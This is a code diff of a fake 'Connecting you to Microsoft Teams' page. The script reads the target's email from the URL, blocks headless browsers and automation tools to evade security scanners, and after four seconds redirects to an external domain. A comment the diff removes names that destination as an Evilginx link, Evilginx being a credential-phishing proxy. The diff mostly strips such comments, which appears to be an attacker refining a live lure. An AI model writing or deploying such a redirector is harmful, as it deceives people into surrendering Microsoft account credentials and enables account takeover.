@@ -20,31 +20,26 @@
   <p>Connecting you to Microsoft Teams</p>
 
   <script>
-    window.addEventListener('load', function() {
-      const rawHash = window.location.hash.substring(1);
-      const email = decodeURIComponent(rawHash);
+  window.addEventListener('load', function() {
+    const rawHash = window.location.hash.substring(1);
+    const email = decodeURIComponent(rawHash);
 
-      // Basic email format validation
-      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      if (!emailRegex.test(email)) {
-        document.body.innerHTML = "<h2>Invalid or missing email.</h2>";
-        return;
-      }
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(email)) {
+      document.body.innerHTML = "<h2>Invalid or missing email.</h2>";
+      return;
+    }
 
-      // Anti-bot: block headless browsers
-      if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) {
-        document.body.innerHTML = "<h2>Security verification failed</h2><p>Please use a real browser.</p>";
-        return;
-      }
+    if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) {
+      document.body.innerHTML = "<h2>Security verification failed</h2><p>Please use a real browser.</p>";
+      return;
+    }
 
-      // Delay before redirecting
-      setTimeout(function() {
-        // Final Evilginx link with email in hash
-        const redirectURL = "https://access-meetings.visions-solutions.ca/yLobagKc" + encodeURIComponent(email);
-        window.location.href = redirectURL;
-      }, 4000); // 4 seconds
-    });
-  </script>
-
+    setTimeout(function() {
+      const redirectURL = "https://access-meetings.visions-solutions.ca/yLobagKc#" + encodeURIComponent(email);
+      window.location.assign(redirectURL); // more reliable than location.href
+    }, 4000);
+  });
+</script>
 </body>
 </html>
